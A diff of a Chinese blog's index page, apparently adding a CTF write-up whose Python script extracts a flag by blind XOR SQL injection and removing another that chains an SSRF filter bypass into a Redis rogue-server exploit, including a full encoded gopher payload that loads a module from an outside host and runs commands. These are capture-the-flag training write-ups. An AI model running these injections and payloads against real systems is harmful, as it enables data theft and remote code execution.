@@ -227,7 +227,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">81</span>
+          <span class="site-state-item-count">82</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -240,7 +240,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">95</span>
+        <span class="site-state-item-count">96</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -279,6 +279,121 @@
       
 
       
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2020/09/09/BUUOJ%E5%88%B7%E9%A2%98-Web-Hack-World/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/avatar.jpeg">
+      <meta itemprop="name" content="Tiaonmmn.ZMZ">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tiaonmmn's Littile House">
+    </span>
+
+    
+    
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/09/09/BUUOJ%E5%88%B7%E9%A2%98-Web-Hack-World/" class="post-title-link" itemprop="url">BUUOJ刷题-Web-Hack-World</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-09-09 17:21:55" itemprop="dateCreated datePublished" datetime="2020-09-09T17:21:55+08:00">2020-09-09</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2020-09-21 16:08:47" itemprop="dateModified" datetime="2020-09-21T16:08:47+08:00">2020-09-21</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
+        </span>
+    </span>
+
+  
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2020/09/09/BUUOJ%E5%88%B7%E9%A2%98-Web-Hack-World/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/09/09/BUUOJ%E5%88%B7%E9%A2%98-Web-Hack-World/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>606</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>1 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>很明显，select flag from flag，然后过滤了一堆东西，发现没有过滤^，异或注入。 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://e9104091-792d-476b-8ba6-d151cc2204fe.node3.buuoj.cn/index.php&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">17</span>,<span class="number">127</span>):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        x=requests.post(url,data=&#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>:<span class="string">&quot;1^(ascii(substring((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;)^0&quot;</span>.format(a,b)</span><br><span class="line">        &#125;)</span><br><span class="line">        print(<span class="string">&quot;1^(ascii(substring((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;)^0&quot;</span>.format(a,b))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello, glzjin wants a girlfriend.&quot;</span> <span class="keyword">in</span> x.text:</span><br><span class="line">            flag+=chr(b)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
+
+    <div id="aplayer-LhsjcqYi" class="aplayer aplayer-tag-marker meting-tag-marker"
+         data-id="33004351" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-loop="all"
+    ></div>
+<p>flag{2af40d57-a06b-4621-aef6-6b4ef6a5be7c}</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -1415,126 +1530,6 @@ $filter = "/union|and|\bor\b|information_schema|updatexml/i";
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2020/07/16/BUUOJ%E5%88%B7%E9%A2%98-Web-SSRFMe/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/avatar.jpeg">
-      <meta itemprop="name" content="Tiaonmmn.ZMZ">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tiaonmmn's Littile House">
-    </span>
-
-    
-    
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/07/16/BUUOJ%E5%88%B7%E9%A2%98-Web-SSRFMe/" class="post-title-link" itemprop="url">BUUOJ刷题-Web-SSRFMe</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2020-07-16 00:42:25" itemprop="dateCreated datePublished" datetime="2020-07-16T00:42:25+08:00">2020-07-16</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2020-09-01 21:15:00" itemprop="dateModified" datetime="2020-09-01T21:15:00+08:00">2020-09-01</time>
-      </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
-        </span>
-    </span>
-
-  
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2020/07/16/BUUOJ%E5%88%B7%E9%A2%98-Web-SSRFMe/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2020/07/16/BUUOJ%E5%88%B7%E9%A2%98-Web-SSRFMe/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-      </div>
-      <div class="post-meta">
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>4.3k</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>4 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>2020年网鼎杯玄武组的SSRFMe。 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params">$url</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $match_result=preg_match(<span class="string">&#x27;/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/&#x27;</span>,$url);</span><br><span class="line">    <span class="keyword">if</span> (!$match_result)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        $url_parse=parse_url($url);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> $e)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $hostname=$url_parse[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    $ip=gethostbyname($hostname);</span><br><span class="line">    $int_ip=ip2long($ip);</span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == $int_ip&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == $int_ip&gt;&gt;<span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params">$url</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip($url))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> $url.<span class="string">&#x27; is inner ip&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $result_info = curl_getinfo($ch);</span><br><span class="line">        <span class="keyword">if</span> ($result_info[<span class="string">&#x27;redirect_url&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            safe_request_url($result_info[<span class="string">&#x27;redirect_url&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        var_dump($output);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    $url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($url))&#123;</span><br><span class="line">        safe_request_url($url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Please visit hint.php locally.</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure> 很明显，SSRF，还涉及parse_url和curl的问题。先看check_inner_ip。协议要http https pogher dict，然后用parse_url得到host，gethostbyname把域名转成IP。然后用ip2long判断IP是否属于127.*.*.* 172.16.*.*-172.32.*.* 192.168.*.*范围，是则认为是内部地址。然而本地要求不能是本地IP，但是hint.php又要求是本地IP访问。 如何绕过？有两种思路：一是利用DNS Rebinding。让域名在check_inner_ip的时候为外部地址，而curl请求的时候又变成内部IP。有<a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html">平台</a>可以做到，但是会随机变化，要多打几次。二是利用一个特殊IP：0.0.0.0。这个IP在配服务的时候应该见过。在服务端被视为任意IP地址，包括服务自身的地址。因此我们把IP设成0.0.0.0就可以了。</p>
-<p>直接访问http://9bcb67ea-7fa8-4be8-857b-2599bad85b16.node3.buuoj.cn/?url=http://0.0.0.0/hint.php。得到hint.php内容：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">  file_put_contents($_POST[<span class="string">&#x27;file&#x27;</span>],<span class="string">&quot;&lt;?php echo &#x27;redispass is root&#x27;;exit();&quot;</span>.$_POST[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>内网Redis，Gopher协议。对付Redis，一般几种方向：写ssh密钥，写crontab，写Shell，以及最新爆出来的主从复制。先试一下写文件，Gopher的payload有点长，不想手动抓包，直接用<a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">工具</a>。发现ssh crontab shell都失败了，只能主从复制了。</p>
-<p>这次要用到<a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">这个</a>的exp.so和<a target="_blank" rel="noopener" href="https://github.com/xmsec/redis-ssrf">这个</a>。BUU环境下我们还需要一台靶机当Rogue Server。修改ssrf-redis.py，改一下IP地址和命令，配套的rogue-server.py默认监听6666端口，就不改了，然后运行生成payload。注意由于要过curl，需要二次URL编码。</p>
-<p>然后访问<code>http://9bcb67ea-7fa8-4be8-857b-2599bad85b16.node3.buuoj.cn/?url=gopher://0.0.0.0:6379/%5f%25%32%41%32%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%41%55%54%48%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%72%6f%6f%74%25%30%44%25%30%41%25%32%41%33%25%30%44%25%30%41%25%32%34%37%25%30%44%25%30%41%53%4c%41%56%45%4f%46%25%30%44%25%30%41%25%32%34%31%32%25%30%44%25%30%41%31%37%34%2e%32%2e%37%32%2e%31%33%35%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%36%36%36%36%25%30%44%25%30%41%25%32%41%34%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%43%4f%4e%46%49%47%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%53%45%54%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%64%69%72%25%30%44%25%30%41%25%32%34%35%25%30%44%25%30%41%2f%74%6d%70%2f%25%30%44%25%30%41%25%32%41%34%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%63%6f%6e%66%69%67%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%73%65%74%25%30%44%25%30%41%25%32%34%31%30%25%30%44%25%30%41%64%62%66%69%6c%65%6e%61%6d%65%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%65%78%70%2e%73%6f%25%30%44%25%30%41%25%32%41%33%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%4d%4f%44%55%4c%45%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%4c%4f%41%44%25%30%44%25%30%41%25%32%34%31%31%25%30%44%25%30%41%2f%74%6d%70%2f%65%78%70%2e%73%6f%25%30%44%25%30%41%25%32%41%32%25%30%44%25%30%41%25%32%34%31%31%25%30%44%25%30%41%73%79%73%74%65%6d%2e%65%78%65%63%25%30%44%25%30%41%25%32%34%31%34%25%30%44%25%30%41%63%61%74%25%32%34%25%37%42%49%46%53%25%37%44%2f%66%6c%61%67%25%30%44%25%30%41%25%32%41%31%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%71%75%69%74%25%30%44%25%30%41</code>即可。注意要先访问一遍进行同步，然后才可以执行命令。由于rogue-server.py不等待同步完成就退出，可能造成exp.so没有传完就结束了，所以需要一个死循环反复执行。</p>
-<p>https://lock.cmpxchg8b.com/rebinder.html 
-    <div id="aplayer-EOPQNhVj" class="aplayer aplayer-tag-marker meting-tag-marker"
-         data-id="28109228" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-loop="all"
-    ></div></p>
-<p>flag{e7cfe6b7-db69-4a88-8889-fa7fc11e538c}</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1591,14 +1586,14 @@ $filter = "/union|and|\bor\b|information_schema|updatexml/i";
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">342k</span>
+    <span title="站点总字数">343k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span>站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">5:11</span>
+    <span title="站点阅读时长">5:12</span>
   </span>
 </div>
 <div class="busuanzi-count">
